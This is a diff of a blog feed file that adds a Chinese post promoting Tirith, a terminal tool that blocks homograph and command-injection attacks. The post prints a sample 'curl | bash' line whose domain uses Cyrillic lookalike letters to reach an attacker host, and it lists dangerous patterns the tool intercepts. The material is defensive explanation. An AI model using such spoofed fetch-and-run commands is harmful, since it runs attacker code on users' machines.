@@ -4,6 +4,37 @@
   
   
   <entry>
+    <title>终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入</title>
+    <link href="/2026/02/06/%E7%BB%88%E7%AB%AF%E9%87%8C%E7%9A%84%E5%AE%88%E6%8A%A4%E8%80%85Tirith/"/>
+    <url>/2026/02/06/%E7%BB%88%E7%AB%AF%E9%87%8C%E7%9A%84%E5%AE%88%E6%8A%A4%E8%80%85Tirith/</url>
+    
+    <content type="html"><![CDATA[<h1 id="终端里的“守护者”：Tirith-——-彻底根除同形攻击与恶意指令注入"><a href="#终端里的“守护者”：Tirith-——-彻底根除同形攻击与恶意指令注入" class="headerlink" title="终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入"></a>终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入</h1><p>作为一名开发者，我们的日常几乎离不开终端。从 GitHub 复制一段 <code>curl</code> 指令，或者在 Stack Overflow 拷贝一行 <code>docker</code> 配置。你是否曾想过，这些看起来人畜无害的字符背后，可能隐藏着足以摧毁你服务器的“赛博病毒”？</p><p>今天，我想安利一个能救命的开源项目 —— **<a href="https://github.com/sheeki03/tirith">Tirith</a>**。</p><hr><h2 id="😱-致命的“像素级”骗局"><a href="#😱-致命的“像素级”骗局" class="headerlink" title="😱 致命的“像素级”骗局"></a>😱 致命的“像素级”骗局</h2><p>请睁大眼睛，看看下面这两行代码有什么不同？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Line A (Safe)</span><br>curl -sSL https://install.example-cli.dev | bash <br><br><span class="hljs-comment"># Line B (Compromised)</span><br>curl -sSL https://іnstall.example-clі.dev | bash<br></code></pre></td></tr></table></figure><p><strong>答案是：</strong> 没有任何区别。至少对你的肉眼和默认终端配置来说是这样的。</p><p><strong>但真相是：</strong> Line B 中的字母 <code>і</code> 并不是英语字母，而是 **西里尔字母 (U+0456)**。它会引导你的 <code>curl</code> 请求访问一个完全由攻击者控制的伪造域名。</p><p>如果你按下回车，你执行的不再是安装脚本，而是攻击者的恶意 Payload。浏览器在几年前就解决了这个问题，但<strong>我们的终端（Terminal）至今依然是“不设防”的。</strong></p><hr><h2 id="🛡️-Tirith：终端世界的“米纳斯提里斯”"><a href="#🛡️-Tirith：终端世界的“米纳斯提里斯”" class="headerlink" title="🛡️ Tirith：终端世界的“米纳斯提里斯”"></a>🛡️ Tirith：终端世界的“米纳斯提里斯”</h2><p>Tirith 取名自《指环王》中的刚铎都城，意为“守护者”。它是一个极轻量、零延迟的命令行安全网关，旨在通过自动化扫描拦截这些肉眼不可见的危险。</p><h3 id="🚀-它的核心能力："><a href="#🚀-它的核心能力：" class="headerlink" title="🚀 它的核心能力："></a>🚀 它的核心能力：</h3><ol><li><p><strong>同形攻击防御 (Homograph Defense)</strong><br>自动检测指令中包含的非 ASCII 同形字符，一旦发现恶意混淆，立即在执行前强行拦截。</p></li><li><p><strong>ANSI 转义注入防护</strong><br>防止恶意代码利用 ANSI 转义序列清空终端显示或篡改执行结果。</p></li><li><p><strong>管道指令安全预警</strong><br>针对 <code>curl | bash</code> 或 <code>wget | sh</code> 这种“危险模式”，Tirith 会强制弹出 Warning，要求你二次确认。</p></li><li><p><strong>关键配置文件锁定</strong><br>任何试图修改 <code>~/.ssh/authorized_keys</code>、<code>~/.bashrc</code> 或 <code>~/.gitconfig</code> 的可疑行为，都会被 Tirith 锁定并阻断。</p></li></ol><hr><h2 id="🔥-深度体验：为什么它是装机必备？"><a href="#🔥-深度体验：为什么它是装机必备？" class="headerlink" title="🔥 深度体验：为什么它是装机必备？"></a>🔥 深度体验：为什么它是装机必备？</h2><ul><li><strong>性能近乎原生</strong>：基于 Rust 的极简设计，扫描耗时通常小于 1 毫秒，你完全感受不到性能损耗。</li><li><strong>完全本地化</strong>：零数据外泄！所有分析都在你本地机器上完成，不需要任何 API Key。</li><li><strong>全平台兼容</strong>：完美支持 <code>zsh</code>, <code>bash</code>, <code>fish</code> 以及 Windows 上的 <code>PowerShell</code>。</li></ul><hr><h2 id="🛠️-三秒开启“神装”模式"><a href="#🛠️-三秒开启“神装”模式" class="headerlink" title="🛠️ 三秒开启“神装”模式"></a>🛠️ 三秒开启“神装”模式</h2><p><strong>使用 npm 一键安装：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g tirith &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tirith init)</span>&quot;</span><br></code></pre></td></tr></table></figure><p><strong>macOS 玩家专属：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install sheeki03/tap/tirith &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tirith init)</span>&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="💡-结语"><a href="#💡-结语" class="headerlink" title="💡 结语"></a>💡 结语</h2><p>在这个“代码一把梭”的时代，多一份防范就少一分灾难。<strong>Tirith 不是在限制你的自由，它是在你打算“赛博自杀”的时候，帮你拉了一把。</strong></p><p>强烈建议每一位拥有生产服务器或重度依赖终端的同学装上它。</p><hr><blockquote><p>转载请注明出处：<a href="https://boaom.github.io/">boaom.github.io</a></p></blockquote>]]></content>
+    
+    
+    <categories>
+      
+      <category>Linux</category>
+      
+      <category>安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>命令行</tag>
+      
+      <tag>Tirith</tag>
+      
+      <tag>安全工具</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>使用GOST搭建一个简单的端口转发</title>
     <link href="/2022/11/06/%E4%BD%BF%E7%94%A8GOST%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
     <url>/2022/11/06/%E4%BD%BF%E7%94%A8GOST%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
@@ -20,9 +51,9 @@
     
     <tags>
       
-      <tag>学习</tag>
-      
       <tag>Linux</tag>
+      
+      <tag>学习</tag>
       
     </tags>
     
